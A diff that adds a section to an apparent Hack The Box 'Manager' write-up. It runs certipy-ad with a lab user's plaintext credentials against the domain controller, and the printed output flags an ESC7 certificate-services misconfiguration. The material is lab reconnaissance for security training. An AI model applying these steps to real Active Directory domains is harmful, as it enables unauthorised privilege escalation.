@@ -621,3 +621,57 @@ BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandat
 BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
 ```
+
+If we switch back over to our attacker machine, we can use certipy-ad to check for vulnerable certificate templates, as shown below:
+
+```
+certipy-ad find -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.116.131 -target dc01.manager.htb
+```
+
+Next, we will analyse the created text file for vulnerable templates:
+
+```
+head -n 35 20261025120052_Certipy.txt
+```
+
+#### Output:
+
+```
+Certificate Authorities
+  0
+    CA Name                             : manager-DC01-CA
+    DNS Name                            : dc01.manager.htb
+    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
+    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
+    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
+    Certificate Validity End            : 2122-07-27 10:31:04+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : MANAGER.HTB\Administrators
+      Access Rights
+        Enroll                          : MANAGER.HTB\Operator
+                                          MANAGER.HTB\Authenticated Users
+                                          MANAGER.HTB\Raven
+        ManageCa                        : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+                                          MANAGER.HTB\Raven
+        ManageCertificates              : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : MANAGER.HTB\Raven
+                                          MANAGER.HTB\Authenticated Users
+    [+] User ACL Principals             : MANAGER.HTB\Raven
+    [!] Vulnerabilities
+      ESC7                              : User has dangerous permissions.
+```
+
+The vulnerabilities section has identified ESC7 - An Active Directory Certificate Services attack.
